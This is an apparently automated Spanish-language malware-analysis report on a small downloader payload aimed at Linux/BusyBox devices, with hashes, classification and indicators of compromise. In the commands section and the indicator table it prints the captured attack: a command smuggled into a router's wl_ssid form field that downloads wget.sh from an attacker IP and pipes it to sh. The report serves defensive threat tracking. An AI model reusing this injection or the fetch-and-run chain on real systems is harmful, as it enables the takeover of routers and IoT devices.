# 🧬 Payload Analysis

`4daa5614c15f95b681893abc5260f1ce028eafec7cd1943a7bddd5931e206030`

## 📌 Resumen

Texto ASCII de 243 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s lwizard`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-`
5. `busybox wget hxxp://91.92.40.XXX/` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/4daa5614c15f95b681893abc5260f1ce028eafec7cd1943a7bddd5931e206030.md](../../../../../malware-like/oraculo/downloader/4daa5614c15f95b681893abc5260f1ce028eafec7cd1943a7bddd5931e206030.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `4daa5614c15f95b681893abc5260f1ce028eafec7cd1943a7bddd5931e206030`
- **SHA1:** `1f2637a5aad73e47378c037a6a41d0b9bcb0d0b3`
- **MD5:** `8288cf11354f059fb7b4982f79511fc5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 243 B |
| Entropía | 4.94 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
wl_ssid=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwizard%3Bbusybox%20wget%20http://91.92.40.XXX/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwizard%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwizard%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lwizard&wizard_step=2&submit_button=next | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | wl_ssid=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwizard%3Bbusybox%20wget%20http://91.92.40.XXX/ | strings |
| hash | 4daa5614c15f95b681893abc5260f1ce028eafec7cd1943a7bddd5931e206030 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
